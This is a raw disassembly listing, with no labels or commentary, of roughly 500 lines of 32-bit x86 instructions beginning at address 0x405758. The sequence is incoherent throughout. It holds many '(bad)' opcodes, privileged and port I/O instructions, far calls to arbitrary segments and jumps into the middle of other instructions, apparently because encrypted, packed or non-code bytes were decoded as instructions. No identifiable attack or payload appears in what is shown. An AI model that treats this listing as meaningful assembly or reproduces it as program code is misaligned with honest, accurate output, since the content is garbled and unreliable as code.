  405758:	call   0x3cb80e16
  40575d:	push   ebx
  40575e:	mov    eax,ds:0xe4f87ebd
  405763:	dec    edi
  405764:	or     DWORD PTR [ebx+0x265d01d1],esp
  40576a:	lock xor ebp,edi
  40576d:	pop    edx
  40576e:	popa   
  40576f:	into   
  405770:	popf   
  405771:	adc    eax,0x5312b2c0
  405776:	leave  
  405777:	xchg   esp,eax
  405778:	(bad)  
  405779:	int3   
  40577a:	dec    ebp
  40577b:	adc    eax,DWORD PTR [ebp-0x15]
  40577e:	fs pop ds
  405780:	outs   dx,BYTE PTR ds:[esi]
  405781:	test   eax,0xdc4728e0
  405786:	adc    ebx,esi
  405788:	and    al,0x4c
  40578a:	xchg   BYTE PTR [ebx],dh
  40578c:	add    cl,ch
  40578e:	loop   0x4057d5
  405790:	jns    0x40577a
  405792:	jg     0x40578c
  405794:	pop    ebx
  405795:	test   eax,0x7fe5f2cb
  40579a:	aas    
  40579b:	mov    ebp,0xfb11b454
  4057a0:	(bad)  
  4057a1:	lahf   
  4057a2:	xchg   edx,eax
  4057a3:	outs   dx,DWORD PTR ds:[esi]
  4057a4:	xchg   BYTE PTR [esi-0xe],cl
  4057a7:	or     bh,BYTE PTR [edi+ebx*2-0x51]
  4057ab:	iret   
  4057ac:	loopne 0x4057a7
  4057ae:	ins    BYTE PTR es:[edi],dx
  4057af:	and    BYTE PTR [bp+di-0x303d],dl
  4057b4:	dec    eax
  4057b5:	push   ds
  4057b6:	mul    DWORD PTR [edi-0x1eaa4229]
  4057bc:	mov    dh,0x62
  4057be:	repz and dl,0xf0
  4057c2:	loopne 0x405750
  4057c4:	call   0xe6d7:0xb8e40fa1
  4057cb:	shr    DWORD PTR [ecx-0x12],1
  4057ce:	sbb    ch,al
  4057d0:	cmp    DWORD PTR [ecx+0x4e],0xaba71d96
  4057d7:	or     ah,BYTE PTR [ebp+0x56c50685]
  4057dd:	imul   ah
  4057df:	sub    DWORD PTR [ebx+0x48],edi
  4057e2:	lock stos DWORD PTR es:[edi],eax
  4057e4:	data16 outs dx,BYTE PTR ds:[esi]
  4057e6:	mov    eax,0x17189fd3
  4057eb:	and    DWORD PTR [ebp-0x2d],0xffffff9c
  4057ef:	mov    BYTE PTR [esi+0x79],bl
  4057f2:	and    BYTE PTR [esp+eiz*2],bh
  4057f5:	and    al,0xb0
  4057f7:	imul   BYTE PTR [esi+0x519f72df]
  4057fd:	jge    0x40579c
  4057ff:	outs   dx,BYTE PTR ds:[esi]
  405800:	mov    bh,0x4c
  405802:	inc    BYTE PTR [eax+eax*8-0x37816107]
  405809:	ffree  st(7)
  40580b:	add    esi,esp
  40580d:	adc    al,0x47
  40580f:	mov    ebx,esi
  405811:	xor    dh,BYTE PTR [ebp+0x24]
  405814:	call   0x24bf:0xb220b940
  40581b:	jmp    0x4057bb
  40581d:	inc    esi
  40581e:	and    eax,0xc4f0812a
  405823:	mov    ebp,0xc48547b1
  405828:	sbb    cl,bl
  40582a:	inc    esi
  40582b:	jge    0x405861
  40582d:	cli    
  40582e:	xchg   edi,eax
  40582f:	(bad)
  405834:	cwde   
  405835:	call   0x90ce0250
  40583a:	sbb    eax,0x62228e91
  40583f:	rcl    DWORD PTR [edi],0xeb
  405842:	into   
  405843:	fs arpl ax,ax
  405846:	mov    esi,0xe4c2a1e1
  40584b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40584c:	ret    
  40584d:	cs xor al,0xae
  405850:	xchg   DWORD PTR [ebp+0x18],edx
  405853:	mov    ds:0x9f59ff33,al
  405858:	jle    0x405845
  40585a:	imul   eax,DWORD PTR [eax],0x5b
  40585d:	aaa    
  40585e:	call   0x11c6:0xfb7c7251
  405865:	faddp  st(5),st
  405867:	aam    0x3a
  405869:	aam    0xe7
  40586b:	mov    ds:0x8d17887,al
  405870:	add    BYTE PTR [edi+esi*2+0x6d384ca],ch
  405877:	in     al,dx
  405878:	pop    esp
  405879:	and    DWORD PTR [ecx+ecx*2],esp
  40587c:	stos   DWORD PTR es:[edi],eax
  40587d:	xchg   ebp,eax
  40587e:	dec    ecx
  40587f:	xchg   esi,eax
  405880:	dec    edx
  405881:	or     al,0xba
  405883:	adc    BYTE PTR [ecx-0x1aed8f11],0xf0
  40588a:	(bad)  
  40588b:	in     al,0x2d
  40588d:	lidtd  [eax+0x6fa2ad98]
  405894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405895:	sub    eax,0xb7b7f886
  40589a:	int    0x55
  40589c:	or     DWORD PTR [ebx+0x15ee856e],0xba92ff3e
  4058a6:	or     ch,BYTE PTR [ebx+0x7845a87f]
  4058ac:	out    0x75,al
  4058ae:	jnp    0x40584a
  4058b0:	mov    ah,0x14
  4058b2:	pop    edx
  4058b3:	or     al,0x1e
  4058b5:	(bad)  
  4058b6:	dec    edx
  4058b7:	int    0x71
  4058b9:	sbb    ecx,DWORD PTR [edi+0x760fe79c]
  4058bf:	out    0x50,al
  4058c1:	sbb    eax,0x5c1f5d91
  4058c6:	or     al,0x7d
  4058c8:	dec    ebp
  4058c9:	add    edi,0xe21a26d8
  4058cf:	das    
  4058d0:	das    
  4058d1:	jnp    0x405907
  4058d3:	push   ebp
  4058d4:	lds    ebp,FWORD PTR [esi]
  4058d6:	xchg   edi,eax
  4058d7:	pop    ss
  4058d8:	mov    esp,0x7934f2d7
  4058dd:	jmp    0x405918
  4058df:	call   0xffa7:0x80ee74ac
  4058e6:	sti    
  4058e7:	(bad)  
  4058e8:	dec    edi
  4058e9:	mov    dl,0x20
  4058eb:	sub    DWORD PTR [esi-0x13],ebp
  4058ee:	repz sbb cl,ch
  4058f1:	std    
  4058f2:	ja     0x4058c8
  4058f4:	adc    al,0x41
  4058f6:	addr16 jo 0x405887
  4058f9:	or     BYTE PTR [edi],bl
  4058fb:	dec    esi
  4058fc:	sti    
  4058fd:	push   es
  4058fe:	xor    edi,ecx
  405900:	stos   BYTE PTR es:[edi],al
  405901:	(bad)  [edi]
  405903:	add    bl,bh
  405905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405906:	xchg   ebp,eax
  405907:	arpl   WORD PTR [edi-0x68],bx
  40590a:	retf   
  40590b:	mov    esp,0xa0c0b1fa
  405910:	xchg   ebx,eax
  405911:	pop    edx
  405912:	mov    edi,0xd23ae06c
  405917:	sub    esp,DWORD PTR [edi]
  405919:	pop    ss
  40591a:	stc    
  40591b:	pop    ecx
  40591c:	iret   
  40591d:	adc    eax,0xfd6a93c5
  405922:	sub    esp,DWORD PTR [eax-0x54da310b]
  405928:	jnp    0x4058aa
  40592a:	cdq    
  40592b:	xchg   esi,eax
  40592c:	or     dh,dl
  40592e:	int    0x34
  405930:	popa   
  405931:	retf   0xf2b5
  405934:	mov    ebx,0xec048a7
  405939:	cmp    DWORD PTR [edi],edx
  40593b:	add    BYTE PTR [ebx-0x11fd1a74],0x5
  405942:	int3   
  405943:	sub    DWORD PTR [edx-0x37],ebp
  405946:	or     esi,ebp
  405948:	into   
  405949:	(bad)  
  40594a:	popf   
  40594b:	iret   
  40594c:	repz sbb eax,0xf03586b
  405952:	mov    al,ds:0xb0f652b0
  405957:	cmp    al,0x7
  405959:	dec    esi
  40595a:	cmc    
  40595b:	dec    ecx
  40595c:	fmul   QWORD PTR [ebx+0x43]
  40595f:	(bad)  
  405960:	(bad)  [edx-0x18]
  405963:	add    al,BYTE PTR [edi]
  405965:	sahf   
  405966:	pop    ebx
  405967:	sub    BYTE PTR ds:[ebx-0x7],al
  40596b:	pop    es
  40596c:	xor    ch,BYTE PTR [eax]
  40596e:	in     eax,dx
  40596f:	dec    esi
  405970:	and    edx,edi
  405972:	aaa    
  405973:	xor    al,0x6b
  405975:	enter  0x2ca2,0x61
  405979:	mov    ebx,0x69ac3667
  40597e:	push   cs
  40597f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405980:	pop    esp
  405981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405982:	ds push edx
  405984:	mov    ds:0x8b155dec,al
  405989:	xchg   ebp,eax
  40598a:	jb     0x4059e8
  40598c:	ret    
  40598d:	or     DWORD PTR ds:0x9e0005bb,edi
  405993:	or     al,0x92
  405995:	sub    DWORD PTR [ecx],esp
  405997:	sbb    al,0xfc
  405999:	cmp    BYTE PTR [ebp-0x3e],ch
  40599c:	outs   dx,BYTE PTR ds:[esi]
  40599d:	sar    DWORD PTR [eax+eiz*4+0x4192d698],0x40
  4059a5:	inc    esi
  4059a6:	jg     0x405a02
  4059a8:	or     BYTE PTR [edi-0xe],dh
  4059ab:	imul   ebp,DWORD PTR [edi],0x1387942c
  4059b1:	add    al,BYTE PTR [edx]
  4059b3:	fwait
  4059b4:	mov    ds:0xcbe2428d,al
  4059b9:	xchg   ebp,eax
  4059ba:	adc    eax,0xa12dfd30
  4059bf:	pop    edx
  4059c0:	cmp    ecx,DWORD PTR [ecx+ebx*8+0x3b]
  4059c4:	xlat   BYTE PTR ds:[ebx]
  4059c5:	adc    BYTE PTR cs:[edi-0x13c91f2b],cl
  4059cc:	cmp    dl,BYTE PTR [esi+0x5d60a02a]
  4059d2:	(bad)  
  4059d3:	mov    ch,0x95
  4059d5:	test   BYTE PTR [ecx+eax*8],cl
  4059d8:	arpl   WORD PTR [eax+0x71d27667],cx
  4059de:	mov    DWORD PTR [esi],ebx
  4059e0:	mov    ?,ebp
  4059e2:	dec    ecx
  4059e3:	fild   DWORD PTR [ebx+0x41a9c95e]
  4059e9:	(bad)  
  4059ea:	pop    ebx
  4059eb:	popf   
  4059ec:	lods   al,BYTE PTR ds:[esi]
  4059ed:	les    edi,FWORD PTR [ebp+0x26351ff7]
  4059f3:	cld    
  4059f4:	adc    DWORD PTR [esi],0x1328020b
  4059fa:	push   edi
  4059fb:	push   ebx
  4059fc:	inc    esi
  4059fd:	imul   edi,DWORD PTR [esp+ebp*1+0x70],0x23
  405a02:	shl    BYTE PTR [ecx-0x5abd6423],0x98
  405a09:	xchg   esi,eax
  405a0a:	mov    DWORD PTR [edx+0xf],edi
  405a0d:	lods   eax,DWORD PTR ds:[esi]
  405a0e:	ficom  WORD PTR [esp+edx*4+0x79]
  405a12:	pop    edi
  405a13:	push   cs
  405a14:	enter  0x789d,0xb0
  405a18:	imul   esp,DWORD PTR [edx+edx*2+0x63],0x6e3300e0
  405a20:	sti    
  405a21:	retf   
  405a22:	ja     0x4059c1
  405a24:	inc    esp
  405a25:	jl     0x4059ba
  405a27:	aam    0x55
  405a29:	stc    
  405a2a:	test   al,ah
  405a2c:	shl    DWORD PTR [eax],cl
  405a2e:	call   0x6ad63e4c
  405a33:	fst    st(6)
  405a35:	xchg   ecx,eax
  405a36:	cmp    eax,0x1ed6e26e
  405a3b:	push   esp
  405a3c:	lods   eax,DWORD PTR ds:[esi]
  405a3d:	daa    
  405a3e:	jae    0x405a12
  405a40:	xchg   esp,eax
  405a41:	jne    0x405a20
  405a43:	fist   WORD PTR [eax+eax*2+0x2b89c066]
  405a4a:	pop    esi
  405a4b:	pushf  
  405a4c:	sub    al,BYTE PTR [esi]
  405a4e:	push   cs
  405a4f:	pop    ebx
  405a50:	ret    0xd1d6
  405a53:	ins    DWORD PTR es:[edi],dx
  405a54:	sub    al,0x90
  405a56:	pop    ds
  405a57:	dec    esp
  405a58:	enter  0x914e,0x3f
  405a5c:	pop    eax
  405a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a5e:	jnp    0x405aac
  405a60:	mov    al,0x6c
  405a62:	and    ch,dl
  405a64:	fisubr WORD PTR [eax+0x143a91c2]
  405a6a:	cmp    ecx,ebx
  405a6c:	mov    dl,0xe
  405a6e:	fsub   st(3),st
  405a70:	bound  esi,QWORD PTR [ecx]
  405a72:	scas   eax,DWORD PTR es:[edi]
  405a73:	inc    ecx
  405a74:	add    al,0x16
  405a76:	xchg   esi,eax
  405a77:	das    
  405a78:	sub    dl,dl
  405a7a:	mov    ebx,0x5038acb4
  405a7f:	lea    esp,[eax]
  405a81:	jmp    0x405a2a
  405a83:	mov    al,0x3b
  405a85:	arpl   WORD PTR [eax],si
  405a87:	retf   0x4713
  405a8a:	push   edx
  405a8b:	imul   esp,DWORD PTR [edi+0x75],0x5e1eb671
  405a92:	adc    al,0xf2
  405a94:	jmp    0x24a0:0xc969064c
  405a9b:	pop    edx
  405a9c:	adc    dh,BYTE PTR [ebp-0x4c]
  405a9f:	xlat   BYTE PTR ds:[ebx]
  405aa0:	popf   
  405aa1:	cmp    eax,0x98c9bb9
  405aa6:	sub    al,0x4f
  405aa8:	xchg   BYTE PTR [eax],ah
  405aaa:	push   0x13ec593f
  405aaf:	xchg   esi,eax
  405ab0:	and    DWORD PTR [ebp-0x7c07b5b4],edi
  405ab6:	jge    0x405b37
  405ab8:	xchg   edi,eax
  405ab9:	mov    bl,0x42
  405abb:	sbb    al,BYTE PTR [ecx-0x5b]
  405abe:	mov    edi,0x515f2126
  405ac3:	cli    
  405ac4:	mov    WORD PTR [esi+0x6e47f4dc],fs
  405aca:	out    dx,al
  405acb:	cmp    BYTE PTR [eax+esi*1],bh
  405ace:	xchg   ecx,eax
  405acf:	or     al,0x15
  405ad1:	mov    BYTE PTR [eax+ebx*4],dh
  405ad4:	xor    eax,0xca634ea5
  405ad9:	jno    0x405ab9
  405adb:	ds dec ecx
  405add:	ror    ebx,cl
  405adf:	mov    ebx,gs
  405ae1:	sub    cl,BYTE PTR [esi+edx*8]
  405ae4:	fwait
  405ae5:	mov    dl,0x94
  405ae7:	push   edx
  405ae8:	fld    TBYTE PTR [ebx+0x372e5f96]
  405aee:	lock sub al,0xe9
  405af1:	(bad)  
  405af2:	lods   al,BYTE PTR ds:[esi]
  405af3:	aad    0x77
  405af5:	fcom   QWORD PTR [ecx-0x36]
  405af8:	int    0x13
  405afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405afb:	in     eax,dx
  405afc:	rcl    DWORD PTR [eax-0x3007c3ff],1
  405b02:	jb     0x405b7d
  405b04:	loopne 0x405af0
  405b06:	aad    0x84
  405b08:	push   0x807b8bbb
  405b0d:	push   ss
  405b0e:	out    dx,eax
  405b0f:	adc    edx,ebp
  405b11:	das    
  405b12:	stos   DWORD PTR es:[edi],eax
  405b13:	cmp    BYTE PTR [edi],dl
  405b15:	rep outs dx,DWORD PTR ds:[esi]
  405b17:	scas   al,BYTE PTR es:[edi]
  405b18:	shl    DWORD PTR [edx-0x79],cl
  405b1b:	or     edi,edx
  405b1d:	mov    bl,0x72
  405b1f:	jnp    0x405b9c
  405b21:	cs call 0x7b3409d4
  405b27:	not    BYTE PTR [eax+ebp*4-0x13c60839]
  405b2e:	fcom   DWORD PTR [ecx-0x23e75493]
  405b34:	or     DWORD PTR [ebp-0x4a93faca],ecx
  405b3a:	fdiv   QWORD PTR gs:[ebp+0xa]
  405b3e:	(bad)  [ebp+0x512b65e3]
  405b44:	test   BYTE PTR [eax+0x5b],0x2
  405b48:	addr16 inc ecx
  405b4a:	push   ebx
  405b4b:	jg     0x405b7c
  405b4d:	xlat   BYTE PTR ds:[ebx]
  405b4e:	push   cs
  405b4f:	mov    ebx,0x1aaae1d
  405b54:	retf   
  405b55:	outs   dx,BYTE PTR ds:[esi]
  405b56:	adc    dl,BYTE PTR [edx+0x13]
  405b59:	push   es
  405b5a:	gs pop edx
  405b5c:	lds    ebx,FWORD PTR [edx-0x12]
  405b5f:	out    dx,al
  405b60:	faddp  st(2),st
  405b62:	and    DWORD PTR [esi],esp
  405b64:	into   
  405b65:	clc    
  405b66:	into   
  405b67:	rol    al,1
  405b69:	sub    DWORD PTR [edx+ebp*2+0xd],ebx
  405b6d:	push   esi
  405b6e:	xchg   ebp,eax
  405b6f:	mov    bl,0xe2
  405b71:	in     eax,dx
  405b72:	cmp    BYTE PTR [ebp-0x1b0e323d],dh
  405b78:	xor    DWORD PTR [edi+eiz*8-0x597c9685],esp
  405b7f:	out    0xe7,al
  405b81:	sub    ch,BYTE PTR [ebx]
  405b83:	add    eax,0x17ba66bc
  405b88:	mov    dh,0xa2
  405b8a:	mov    BYTE PTR [edi-0x4f],bl
  405b8d:	sbb    al,0x54
  405b8f:	cmc    
  405b90:	clc    
  405b91:	retf   
  405b92:	push   esi
  405b93:	loop   0x405bb3
  405b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b96:	mov    al,0x5b
  405b98:	adc    BYTE PTR [eax-0x4b],dl
  405b9b:	jnp    0x405b7c
  405b9d:	mov    edx,0x32e14da5
  405ba2:	push   ecx
  405ba3:	cdq    
  405ba4:	jecxz  0x405bbc
  405ba6:	lods   eax,DWORD PTR ds:[esi]
  405ba7:	mov    ecx,0xb41abd10
  405bac:	mov    cl,0x55
  405bae:	mov    ss,WORD PTR [edx+0x3131b8e3]
  405bb4:	add    eax,0xf5cb1992
  405bb9:	rcl    ah,1
  405bbb:	xor    DWORD PTR [ecx+ebp*4+0x32dae864],ebx
  405bc2:	pusha  
  405bc3:	cli    
  405bc4:	lods   eax,DWORD PTR ds:[esi]
  405bc5:	and    eax,0x9be3c93
  405bca:	test   eax,0x54a8e866
  405bcf:	call   0xfd2c:0x49adb185
  405bd6:	mov    WORD PTR [esi],es
  405bd8:	jl     0x405bc9
  405bda:	outs   dx,BYTE PTR ds:[esi]
  405bdb:	add    BYTE PTR [edi],dl
  405bdd:	daa    
  405bde:	push   esi
  405bdf:	clc    
  405be0:	(bad)  
  405be1:	mov    cl,0x42
  405be3:	mov    eax,esp
  405be5:	shl    DWORD PTR [ebp+0x1c],1
  405be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405be9:	mov    es,WORD PTR [esi+0x968675d]
  405bef:	pusha  
  405bf0:	add    BYTE PTR [ebx+ebx*4-0x75],dl
  405bf4:	mov    edi,0x1681e922
  405bf9:	and    cl,bh
  405bfb:	jns    0x405c54
  405bfd:	mov    ebx,0x2a4f7fae
  405c02:	loopne 0x405c83
  405c04:	jg     0x405bdc
  405c06:	hlt    
  405c07:	pop    edi
  405c08:	(bad)  
  405c0a:	mov    dh,0x90
  405c0c:	push   esp
  405c0d:	dec    ebx
  405c0e:	fldenv [ebp-0x7ad8de01]
  405c14:	jg     0x405c40
  405c16:	pop    ebp
  405c17:	in     al,dx
  405c18:	(bad)  
  405c19:	into   
  405c1a:	mov    ds:0x68be7eb1,al
  405c1f:	sub    DWORD PTR ds:0x35d837bf,0x5e2aa5d1
  405c29:	js     0x405bf2
  405c2b:	std    
  405c2c:	pushf  
  405c2d:	dec    esp
  405c2e:	xlat   BYTE PTR ds:[ebx]
  405c2f:	adc    ebx,DWORD PTR [ecx+0x41b70d78]
  405c35:	cmp    al,0xb2
  405c37:	dec    edx
  405c38:	addr16 jne 0x405c2b
  405c3b:	lahf   
  405c3c:	std    
  405c3d:	das    
  405c3e:	sti    
  405c3f:	fst    DWORD PTR [ecx]
  405c41:	and    DWORD PTR [ebx],edi
  405c43:	jecxz  0x405bd8
  405c45:	call   0xac25:0xf79a7022
  405c4c:	addr16 pop eax
  405c4e:	in     al,0xf5
  405c50:	cs (bad) 
  405c52:	mov    al,0x7
  405c54:	push   edx
  405c55:	jmp    0x405c7c
  405c57:	loopne 0x405c33
  405c59:	and    DWORD PTR [eax+ebx*4+0x3c735b8c],ebp
  405c60:	mov    ecx,0x5f67102c
  405c65:	daa    
  405c66:	push   ebp
  405c67:	(bad)  
  405c68:	stc    
  405c69:	xchg   ebx,eax
  405c6a:	mov    edx,DWORD PTR [edi]
  405c6c:	pushf  
  405c6d:	into   
  405c6e:	jmp    0x405c71
  405c70:	cli    
  405c71:	out    0x5c,eax
  405c73:	sub    al,0x6a
  405c75:	inc    ecx
  405c76:	popa   
  405c77:	xor    DWORD PTR [edx+0x12],esp
  405c7a:	imul   ebp,DWORD PTR [edi],0xffffffdd
  405c7d:	pop    ds
  405c7e:	aas    
  405c7f:	jl     0x405cca
  405c81:	mov    dl,0xff
  405c83:	push   cs
  405c84:	push   ebp
  405c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c86:	xor    eax,0x69d65cbf
  405c8b:	iret   
  405c8c:	gs mov bl,dh
  405c8f:	dec    edi
  405c90:	pop    ecx
  405c91:	mov    esi,0x9bc15ced
  405c96:	into   
  405c97:	push   0xfffffff3
  405c99:	xor    ecx,DWORD PTR [eax+0x6e5e9c80]
  405c9f:	test   DWORD PTR [edi-0x54],eax
  405ca2:	inc    edi
  405ca3:	sahf   
  405ca4:	cmc    
  405ca5:	call   0xf646:0x40300438
  405cac:	int3   
  405cad:	push   edi
  405cae:	test   bh,dh
  405cb0:	jl     0x405c41
  405cb2:	das    
  405cb3:	sahf   
  405cb4:	in     eax,dx
  405cb5:	es add al,0xcc
  405cb8:	loope  0x405c93
  405cba:	stos   DWORD PTR es:[edi],eax
  405cbb:	(bad)  
  405cbc:	call   FWORD PTR [esi+0x3ea1ce57]
  405cc2:	mov    ds:0xcdce54be,al
  405cc7:	lods   eax,DWORD PTR ds:[esi]
  405cc8:	add    eax,0xad5571b6
  405ccd:	pop    ecx
  405cce:	je     0x405c78
  405cd0:	xor    al,0x8a
  405cd2:	call   0xcfa248ff
  405cd7:	jne    0x405cde
  405cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cda:	int3   
  405cdb:	mov    eax,0x493f4229
  405ce0:	leave  
  405ce1:	sbb    eax,0x8b406f1f
  405ce6:	ins    BYTE PTR es:[edi],dx
  405ce7:	imul   edi,DWORD PTR [ebx+0x43],0x804a3535
  405cee:	add    eax,0x3d58c1c9
  405cf3:	pop    edi
  405cf4:	and    BYTE PTR [ecx],bl
  405cf6:	cmp    dh,ah
  405cf8:	pop    edi
  405cf9:	cwde   
  405cfa:	jp     0x405c82
  405cfc:	iret   
  405cfd:	ficom  DWORD PTR [esp+ebx*8]
  405d00:	xchg   BYTE PTR [edx+ebp*8],ah
  405d03:	popf   
  405d04:	pop    eax
  405d05:	inc    eax
  405d06:	jg     0x405d17
  405d08:	(bad)  
  405d09:	sbb    eax,0x597dacba
  405d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d0f:	dec    edx
  405d10:	mov    ch,0x2f
  405d12:	jle    0x405caa
  405d14:	push   ds
  405d15:	jns    0x405d24
  405d17:	sub    BYTE PTR ds:0x5ffb5940,ah
  405d1d:	dec    edi
  405d1e:	pop    esp
  405d1f:	push   eax
  405d20:	lods   al,BYTE PTR ds:[esi]
  405d21:	inc    ebp
  405d22:	loop   0x405ca6
  405d24:	push   ebp
  405d25:	leave  
  405d26:	xchg   esi,eax
  405d27:	push   ds
  405d28:	stos   DWORD PTR es:[edi],eax
  405d29:	push   ds
  405d2a:	scas   al,BYTE PTR es:[edi]
  405d2b:	mov    al,0xc5
  405d2d:	cmc    
  405d2e:	in     eax,dx
  405d2f:	and    esp,DWORD PTR [ebx+0x6d]
  405d32:	lods   al,BYTE PTR ds:[esi]
  405d33:	rcr    dl,0x7c
  405d36:	ret    
  405d37:	dec    edx
  405d38:	inc    edi
  405d39:	mov    BYTE PTR [esi+0x4ce6a281],dh
  405d3f:	and    cl,bl
  405d41:	dec    edx
  405d42:	jns    0x405d0a
  405d44:	and    eax,0xd7539495
  405d49:	pop    ebx
  405d4a:	and    BYTE PTR [edi],ch
  405d4c:	sub    ah,dh
  405d4e:	sub    dl,BYTE PTR [ebx-0x6a7644aa]
  405d54:	inc    edx
  405d55:	pop    edi
  405d56:	rol    al,1
  405d58:	sbb    al,bl
  405d5a:	mov    edx,edx
  405d5c:	mov    bl,0xe1
  405d5e:	cmp    ch,0xb7
  405d61:	ds adc eax,0xef36b82a
  405d67:	jnp    0x405dd9
  405d69:	sub    ch,bh
  405d6b:	inc    ebp
  405d6c:	mov    ah,0x33
  405d6e:	jge    0x405d7f
  405d70:	fistp  WORD PTR [ebx]
  405d72:	int    0x38
  405d74:	mov    bh,0x7e
  405d76:	in     al,dx
  405d77:	shr    edi,1
  405d79:	pop    ebp
  405d7a:	adc    DWORD PTR [edx+ecx*2+0x61],esi
  405d7e:	push   esp
  405d7f:	mov    eax,ds:0xed016519
  405d84:	test   al,0x5f
  405d86:	push   edi
  405d87:	mov    ch,0xc9
  405d89:	imul   edx,DWORD PTR [esp-0x32d02c4c],0x433480ed
  405d94:	in     al,dx
  405d95:	mov    eax,DWORD PTR ss:[ebp-0x18890d31]
  405d9c:	(bad)  
  405d9d:	idiv   BYTE PTR [eax+0x57]
  405da0:	lds    edi,FWORD PTR ds:0x9030a65a
  405da6:	push   ebp
  405da7:	sbb    cl,BYTE PTR [edi-0x6e9155d1]
  405dad:	hlt    
  405dae:	shl    eax,1
  405db0:	arpl   WORD PTR [edi-0x3a],si
  405db3:	cmp    al,bh
  405db5:	dec    edx
  405db6:	ret    
  405db7:	xchg   ebp,eax
  405db8:	sbb    BYTE PTR [ebp+ebp*4+0x31f0d82b],0x7e
  405dc0:	and    eax,0x9dc6a67d
  405dc5:	push   esp
  405dc6:	ret    
  405dc7:	or     al,0xf8
  405dc9:	add    DWORD PTR [ebx+0x70],esi
  405dcc:	pop    ebp
  405dcd:	xchg   esi,eax
  405dce:	(bad)  
  405dcf:	jmp    0x405e1f
  405dd1:	push   ecx
  405dd2:	mov    ch,0x1b
  405dd4:	rol    DWORD PTR [eax-0x35d39459],0x59
  405ddb:	stos   BYTE PTR es:[edi],al
  405ddc:	xor    DWORD PTR [eax-0x44b2f526],edi
  405de2:	or     BYTE PTR [ecx-0x9a442d3],al
  405de8:	jns    0x405dcb
  405dea:	mov    ds:0xda8e9b0b,al
  405def:	mov    ss,WORD PTR [esi]
  405df1:	addr16 push esi
  405df3:	lds    edx,FWORD PTR [edi]
  405df5:	and    bl,ch
  405df7:	test   eax,0x24f6d100
  405dfc:	int3   
  405dfd:	fdiv   DWORD PTR [esi+0x3f8603e4]
  405e03:	gs adc al,0x76
  405e06:	shl    BYTE PTR [edi+0x62ccf15f],cl
  405e0c:	dec    eax
  405e0d:	icebp  
  405e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e0f:	sbb    bh,bl
  405e11:	(bad)  
  405e12:	lods   al,BYTE PTR ds:[esi]
  405e13:	xor    eax,0x3dba5391
  405e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e19:	mov    gs,WORD PTR [edx+ebp*2+0x16]
  405e1d:	ins    BYTE PTR es:[edi],dx
  405e1e:	outs   dx,BYTE PTR ds:[esi]
  405e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e20:	shl    DWORD PTR [ebp-0x48b4331a],cl
  405e26:	adc    DWORD PTR [edi-0x1b3fdba3],esp
  405e2c:	mov    dl,0x12
  405e2e:	mov    al,ds:0x10feb8d2
  405e33:	addr16 cmp al,0x42
  405e36:	fld    TBYTE PTR [eax+eiz*1-0x1ffcf8b9]
  405e3d:	inc    eax
  405e3e:	dec    ecx
  405e3f:	adc    dh,BYTE PTR fs:[ebp-0x30]
  405e43:	mov    ebp,0x2450b9ad
  405e48:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405e4a:	mov    edi,ecx
  405e4c:	int3   
  405e4d:	push   edi
  405e4e:	out    dx,eax
  405e4f:	add    al,0x3d
  405e51:	(bad)  
  405e52:	ja     0x405e34
  405e54:	jg     0x405e5d
  405e56:	adc    DWORD PTR [esp+edi*1-0x75],esi
  405e5a:	repz cmp dh,BYTE PTR [esi+0x3487b6a2]
  405e61:	lds    ebx,FWORD PTR [ebx+0x5c]
  405e64:	dec    edx
  405e65:	arpl   WORD PTR [ecx+0x6bf383e1],cx
  405e6b:	cli    
  405e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e6d:	or     eax,0x79b1535e
  405e72:	mov    dl,BYTE PTR [ecx-0x18]
  405e75:	sbb    BYTE PTR [ebx+0x321eb1d9],dh
  405e7b:	stc    
  405e7c:	jne    0x405ee3
  405e7e:	push   0x13
  405e80:	mov    ecx,0x7aba99bd
  405e85:	mov    esi,DWORD PTR [esi-0x3a]
  405e88:	push   cs
  405e89:	mov    ch,0xe5
  405e8b:	pop    ebx
  405e8c:	neg    BYTE PTR [eax+0x72]
  405e8f:	inc    ebx
  405e90:	pusha  
  405e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e92:	pop    esp
  405e93:	or     edx,DWORD PTR [eax-0x23]
  405e96:	outs   dx,DWORD PTR ds:[esi]
  405e97:	loop   0x405f14
  405e99:	fmul   st,st(4)
  405e9b:	jmp    0x120b:0xa2b1df90
  405ea2:	cmp    bl,cl
  405ea4:	daa    
  405ea5:	dec    eax
  405ea6:	cdq    
  405ea7:	(bad)  
  405ea8:	dec    eax
  405ea9:	sbb    si,bp
  405eac:	jae    0x405e6b
  405eae:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	inc    eax
  405eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb2:	pop    esp
  405eb3:	xor    DWORD PTR [ebx],esp
  405eb5:	xchg   ebx,eax
  405eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eb7:	and    DWORD PTR [ebp+eiz*2+0x528cec0b],esp
  405ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ebf:	pushf  
  405ec0:	sbb    ch,BYTE PTR [ecx]
  405ec2:	dec    ebp
  405ec3:	add    edx,DWORD PTR [ebp+0x40863143]
  405ec9:	xchg   BYTE PTR [ebp-0x17],dl
  405ecc:	fdiv   st(5),st
  405ece:	dec    eax
  405ecf:	jge    0x405f34
  405ed1:	in     eax,0xe7
  405ed3:	or     BYTE PTR [esi+0x6d],al
  405ed6:	std    
